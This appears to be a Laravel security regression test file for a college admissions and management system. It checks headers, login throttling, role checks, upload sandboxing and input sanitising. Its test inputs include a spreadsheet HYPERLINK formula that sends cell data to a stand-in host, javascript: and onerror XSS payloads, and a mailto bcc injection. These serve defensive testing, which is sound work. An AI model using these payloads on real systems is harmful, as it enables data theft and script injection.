<?php

namespace Tests\Feature\Security;

use App\Models\AdmissionApplication;
use App\Models\Course;
use App\Models\FacultyProfile;
use App\Models\MeritList;
use App\Models\Post;
use App\Models\Section;
use App\Models\Student;
use App\Models\Subject;
use App\Models\User;
use App\Services\Admissions\Admitter;
use App\Services\Admissions\MeritListService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Tests\Feature\Admissions\AdmissionTestHelpers;
use Tests\TestCase;

/** Regression tests for the security review (see docs/security/SECURITY-REVIEW.md). */
class SecurityHardeningTest extends TestCase
{
    use AdmissionTestHelpers, RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setUpAdmissions();
    }

    private function user(string $role, string $email): User
    {
        return User::create(['name' => ucfirst($role).' '.$email, 'email' => $email, 'password' => Hash::make('password'), 'role' => $role, 'is_active' => true]);
    }

    private function student(array $over = []): Student
    {
        return Student::create($over + [
            'program_id' => $this->bs->id, 'section_id' => Section::first()->id, 'academic_session_id' => $this->session->id,
            'roll_no' => 'BSCS-26-'.str_pad((string) (Student::count() + 1), 3, '0', STR_PAD_LEFT), 'name' => 'Ali Raza', 'father_name' => 'Raza Khan',
            'guardian_phone' => '0300-1234567', 'status' => 'active',
        ]);
    }

    // ---------------------------------------------------------------- browser protections

    public function test_pages_send_security_headers_and_a_nonce_csp(): void
    {
        $res = $this->get(route('login'))->assertOk();

        $res->assertHeader('X-Frame-Options', 'DENY')->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $csp = $res->headers->get('Content-Security-Policy');
        $this->assertMatchesRegularExpression("/script-src 'self' 'nonce-([A-Za-z0-9]+)'/", $csp);
        $this->assertStringContainsString("frame-ancestors 'none'", $csp);
        $this->assertStringContainsString("object-src 'none'", $csp);
        preg_match("/'nonce-([A-Za-z0-9]+)'/", $csp, $m);
        // Every inline script on the page carries the nonce; no inline event handlers remain.
        $html = $res->getContent();
        preg_match_all('/<script\b[^>]*>/', $html, $tags);
        $this->assertNotEmpty($tags[0]);
        foreach ($tags[0] as $tag) {
            $this->assertStringContainsString('nonce="'.$m[1].'"', $tag);
        }
        $this->assertDoesNotMatchRegularExpression('/\son(click|change|submit|load|error)="/', $html);
    }

    // ---------------------------------------------------------------- authentication

    public function test_login_is_capped_per_account_even_from_rotating_ips(): void
    {
        $this->user('principal', 'p1@test.pk');
        foreach (range(1, 10) as $i) {
            $this->withServerVariables(['REMOTE_ADDR' => "10.1.0.{$i}"])->post(route('login'), ['email' => 'p1@test.pk', 'password' => 'wrong'])->assertSessionHasErrors('email');
        }
        $this->withServerVariables(['REMOTE_ADDR' => '10.1.0.200'])->post(route('login'), ['email' => 'p1@test.pk', 'password' => 'password'])
            ->assertSessionHasErrors('email');
        $this->assertGuest();
        $this->assertDatabaseHas('activity_logs', ['action' => 'auth.failed']);
    }

    public function test_a_principal_cannot_take_over_another_principal_or_grant_principal(): void
    {
        $p1 = $this->user('principal', 'p1@test.pk');
        $p2 = $this->user('principal', 'p2@test.pk');
        $teacher = $this->user('teacher', 't1@test.pk');

        $this->actingAs($p1)->post(route('staff.reset-password', $p2))->assertForbidden();
        $this->actingAs($p1)->patch(route('staff.toggle', $p2))->assertForbidden();
        $this->actingAs($p1)->put(route('staff.update', $teacher), [
            'name' => $teacher->name, 'email' => $teacher->email, 'role' => 'principal', 'designation' => 'Lecturer', 'employee_no' => 'EMP-9',
        ])->assertSessionHasErrors('role');
        $this->assertSame('teacher', $teacher->fresh()->role);

        // An administrator can.
        $admin = $this->user('admin', 'a1@test.pk');
        $this->actingAs($admin)->post(route('staff.reset-password', $p2))->assertRedirect();
        $this->assertFalse(Hash::check('password', $p2->fresh()->password));
    }

    // ---------------------------------------------------------------- attendance

    public function test_teacher_cannot_backdate_a_register_or_export_student_pii(): void
    {
        $teacher = $this->user('teacher', 't1@test.pk');
        $course = Course::create(['section_id' => Section::first()->id, 'subject_id' => Subject::create(['name' => 'Programming', 'code' => 'CS-101'])->id, 'teacher_id' => $teacher->id]);
        $s = $this->student();

        $this->actingAs($teacher)->post(route('attendance.save', $course), [
            'date' => today()->subDays(5)->toDateString(), 'time' => '09:01', 'topic' => 'Backdated', 'status' => [$s->id => 'P'],
        ])->assertSessionHas('error');
        $this->assertDatabaseCount('lectures', 0);

        $this->actingAs($teacher)->get(route('students.export'))->assertForbidden();
    }

    public function test_exports_neutralise_spreadsheet_formulas(): void
    {
        $this->student(['name' => '=HYPERLINK("http://x.test/?"&E2,"Ali")']);
        $csv = $this->actingAs($this->user('principal', 'p1@test.pk'))->get(route('students.export'))->streamedContent();

        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringNotContainsString(',"=HYPERLINK', $csv);
    }

    // ---------------------------------------------------------------- admissions

    public function test_officer_cannot_verify_a_draft_and_publishing_keeps_decisions(): void
    {
        $officer = $this->staff('admission_officer');
        $draft = $this->application(['status' => 'draft', 'cnic' => '37405-0000001-1']);
        $this->actingAs($officer)->patch(route('admissions.status', $draft), ['status' => 'verified'])->assertStatus(422);

        $a = $this->application(['status' => 'verified', 'cnic' => '37405-0000002-1', 'merit_score' => 80]);
        $b = $this->application(['status' => 'verified', 'cnic' => '37405-0000003-1', 'merit_score' => 70]);
        $list = (new MeritListService)->generate($this->cycle, $this->bs, 2);
        $b->update(['status' => 'rejected', 'remarks' => 'Fake DMC found at counter']);   // decided after the draft list

        (new MeritListService)->publish($list);
        $this->assertSame('selected', $a->fresh()->status);
        $this->assertSame('rejected', $b->fresh()->status);
        $this->assertSame('published', MeritList::find($list->id)->status);
    }

    public function test_admitting_twice_creates_one_student_and_respects_seats(): void
    {
        $this->bs->update(['seats' => 1]);
        $a = $this->application(['status' => 'verified', 'cnic' => '37405-0000004-1']);
        $b = $this->application(['status' => 'verified', 'cnic' => '37405-0000005-1']);

        $s1 = (new Admitter)->admit($a);
        $s2 = (new Admitter)->admit($a);
        $this->assertSame($s1->id, $s2->id);
        $this->assertSame(1, Student::where('admission_application_id', $a->id)->count());

        $this->expectExceptionMessage('All 1 seats for BSCS are filled.');
        (new Admitter)->admit($b);
    }

    public function test_applicant_files_are_sandboxed_and_long_pdfs_refused(): void
    {
        Storage::fake('local');
        $this->post(route('apply.store'), ['program_id' => $this->bs->id, 'name' => 'Usman Tariq', 'cnic' => '37405-1234567-1', 'phone' => '03001234567', 'email' => 'usman@gmail.com', 'quota' => 'open']);
        $app = AdmissionApplication::sole();

        $pdf = UploadedFile::fake()->createWithContent('cnic.pdf', "%PDF-1.4\n".str_repeat("1 0 obj << /Type /Page >> endobj\n", 9).'%%EOF');
        $this->postJson(route('apply.upload', [$app->tracking_no, 'cnic']), ['file' => $pdf])->assertStatus(422)->assertJsonPath('message', fn ($m) => str_contains($m, 'at most 4 pages'));

        $this->postJson(route('apply.upload', [$app->tracking_no, 'cnic']), ['file' => UploadedFile::fake()->image('cnic.html.png', 800, 500)])->assertOk();
        $doc = $app->documents()->sole();
        $this->assertStringEndsWith('.png', $doc->path);   // extension from content, not the client name
        $csp = $this->get(route('apply.file', [$app->tracking_no, 'cnic']))->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringStartsWith('sandbox', $csp);
    }

    // ---------------------------------------------------------------- website studio / API

    public function test_settings_urls_must_be_https_and_login_emails_are_not_published(): void
    {
        $editor = $this->user('editor', 'e1@test.pk');
        $this->actingAs($editor)->put(route('studio.settings.update'), ['facebook_url' => 'javascript:alert(1)'])->assertSessionHasErrors('facebook_url');

        FacultyProfile::create(['name' => 'Editor Person', 'designation' => 'Lecturer', 'email' => 'e1@test.pk', 'is_published' => true]);
        FacultyProfile::create(['name' => 'Public Person', 'designation' => 'Lecturer', 'email' => 'office@example.com', 'is_published' => true]);
        $emails = collect($this->getJson('/api/v1/faculty')->assertOk()->json('data'))->pluck('email', 'name');
        $this->assertNull($emails['Editor Person']);
        $this->assertSame('office@example.com', $emails['Public Person']);
    }

    public function test_deleting_a_post_removes_its_files_and_copies_do_not_share_them(): void
    {
        Storage::fake('public');
        Storage::disk('public')->put('posts/covers/a.jpg', 'img');
        $editor = $this->user('editor', 'e1@test.pk');
        $post = Post::create(['type' => 'notice', 'title' => 'Exam schedule', 'excerpt' => 'Exam schedule for December.', 'body' => '<p>Hi</p><img src=x onerror=alert(1)>', 'status' => 'published', 'published_at' => now(), 'cover_path' => 'posts/covers/a.jpg', 'author_id' => $editor->id]);
        $this->assertStringNotContainsString('onerror', $post->fresh()->body);   // sanitised at the model

        $this->actingAs($editor)->post(route('studio.posts.duplicate', $post))->assertRedirect();
        $copy = Post::whereKeyNot($post->id)->sole();
        $this->assertNotSame($post->cover_path, $copy->cover_path);

        $this->actingAs($editor)->delete(route('studio.posts.destroy', $copy))->assertRedirect();
        Storage::disk('public')->assertMissing($copy->cover_path);
        Storage::disk('public')->assertExists('posts/covers/a.jpg');
    }

    public function test_contact_form_is_rate_limited_per_ip(): void
    {
        foreach (range(1, 3) as $i) {
            $this->postJson('/api/v1/contact', ['name' => 'Ahmed', 'email' => 'a@example.com', 'subject' => 'Admission query', 'message' => 'When does the BS admission close?'])->assertCreated();
        }
        $this->postJson('/api/v1/contact', ['name' => 'Ahmed', 'email' => 'a@example.com', 'subject' => 'Admission query', 'message' => 'When does the BS admission close?'])->assertStatus(429);
        $this->postJson('/api/v1/contact', ['name' => 'X', 'email' => '"?bcc=spy@evil.test&x="@gmail.com', 'subject' => 'Hello there', 'message' => 'Testing the mailto trick'])->assertStatus(429);
    }
}
